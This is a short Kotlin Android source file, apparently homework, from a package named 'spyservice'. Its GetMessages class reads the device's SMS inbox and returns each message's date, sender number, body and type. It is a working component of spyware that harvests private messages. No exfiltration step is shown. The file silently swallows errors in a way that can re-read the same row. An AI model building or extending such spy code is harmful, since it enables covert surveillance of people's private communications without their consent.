package com.homework.myapplication.spyservice

import android.annotation.SuppressLint
import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.provider.Telephony
import java.util.*

class GetMessages : (Context) -> (List<String>) {
    @SuppressLint("Recycle")
    override fun invoke(context: Context): List<String> {
        val cursor: Cursor =
            context.contentResolver.query(
                Uri.parse("content://sms/inbox"), null, null, null, null
            ) ?: return emptyList()
        val messages: MutableList<String> = ArrayList()
        val totalSMS: Int = cursor.count
        if (cursor.moveToFirst()) {
            for (j in 0 until totalSMS) {
                try {
                    val date = cursor.getString(
                        cursor.getColumnIndexOrThrow(Telephony.Sms.DATE)
                    )
                    val number = cursor.getString(
                        cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)
                    )
                    val body = cursor.getString(
                        cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)
                    )
                    val type: String =
                        when (cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE))
                            .toInt()) {
                            Telephony.Sms.MESSAGE_TYPE_INBOX -> "inbox"
                            Telephony.Sms.MESSAGE_TYPE_SENT -> "sent"
                            Telephony.Sms.MESSAGE_TYPE_OUTBOX -> "outbox"
                            else -> "unknown"
                        }
                    messages.add("$date : $number : $body : $type")
                    cursor.moveToNext()
                } catch (e: Exception) {

                }
            }
        }
        cursor.close()
        return messages
    }
}
